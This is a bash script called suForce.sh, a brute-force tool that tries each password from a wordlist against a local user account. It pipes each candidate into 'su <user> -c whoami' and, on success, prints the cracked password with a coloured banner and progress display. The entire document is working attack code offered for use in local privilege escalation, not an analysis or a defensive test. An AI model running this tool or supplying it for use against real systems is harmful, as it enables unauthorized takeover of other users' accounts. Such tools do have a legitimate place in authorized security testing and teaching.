#!/bin/bash

declare -r White="\e[97m"
declare -r Red="\e[31m"
declare -r BlueLight="\e[94m"
declare -r GreenLight="\e[92m"
declare -r YellowLight="\e[93m"
declare -r CyanLight="\e[96m"
declare -r End="\e[0m"

declare -r var1='['
declare -r var2=']'
declare -r var3='i'
declare -r var4='x'
declare -r var5='>'
declare -r var6='<'
declare -r var7='-'
declare -r var8='+'
declare -r var9='./suForce.sh'
declare -r var10='WORDLIST'
declare -r var11='USER'
declare -r var12='Example:'
declare -r var13='Username:'
declare -r var14='WordList:'
declare -r var15='Password:'
declare -r var16='Line:'
declare -r var17='Error!'
declare -r var18='Fuck!'
declare -r var19='it was not possible to decrypt the password'
declare -r var20='Status:'
declare -r var21='-=================================-'
declare -r var22='[+]'
declare -r var23='[-]'
declare -r var24='[!]'
declare -r var25='[*]'

function banner(){
    echo -e "$GreenLight            _____                        $End"
    echo -e "$Red ___ _   _ $GreenLight|  ___|__  _ __ ___ ___   $End"
    echo -e "$Red/ __| | | |$GreenLight| |_ / _ \| '__/ __/ _ \\ $End"
    echo -e "$Red\__ \ |_| |$GreenLight|  _| (_) | | | (_|  __/  $End"
    echo -e "$Red|___/\__,_|$GreenLight|_|  \___/|_|  \___\___|  $End"
    echo -e "$White$var21$End"
}

function main(){
    echo ""
    echo -e "$YellowLight$var25 $Red$var12 $White$var9 -u $Red$var6$White$var11$Red$var5$White -w $Red$var6$White$var10$Red$var5$End"
    echo ""
}

function info(){
    echo -e "$BlueLight$var25 $White$var13 $CyanLight$username$End"
    sleep 1
    echo -e "$BlueLight$var25 $White$var14 $CyanLight$wordlist$End"
    sleep 1
    echo -e "$YellowLight$var24 $White$var20$End"
    sleep 1
}

while getopts ":u:w:h:" arg; do
    case $arg in
        u) username=$OPTARG; let parameter_counter+=1 ;;
	w) wordlist=$OPTARG; let parameter_counter+=1 ;;
	h) help;;
    esac
done

if [ ! -z $wordlist ]; then
    banner
    sleep 1
else
    banner
    main
    exit 0
fi

if [ ! -z $username ]; then
    info
else
    main
    exit 0
fi

lines=$(/usr/bin/wc -l $wordlist)
regex="([0-9]+).$wordlist"
[[ $lines =~ $regex ]]
siz="${BASH_REMATCH[1]}"

while read password; do
        line=$((line + 1))
        progress=$((line * 100 / siz))
        echo -ne "\r$YellowLight    $line/$siz ($progress%) ($password)       $End"
        echo "$password" | timeout 0.1 bash -c "su $username -c whoami &>/dev/null"
    if [ $? -eq 0 ]; then
        f1=$(/usr/bin/cat $wordlist | /usr/bin/grep "^$password$" -n | /usr/bin/cut -d: -f1)
        echo -e "\n$GreenLight$var22 $Red$var15 $GreenLight$password$Red $var16 $GreenLight$f1"
        echo -e "$White$var21$End"
        echo ""
        sleep 2
        exit 0
    fi
done < $wordlist
echo -e "\r$Red$var23 $Red$var18 $White$var19$End"
echo ""
sleep 2
exit 0
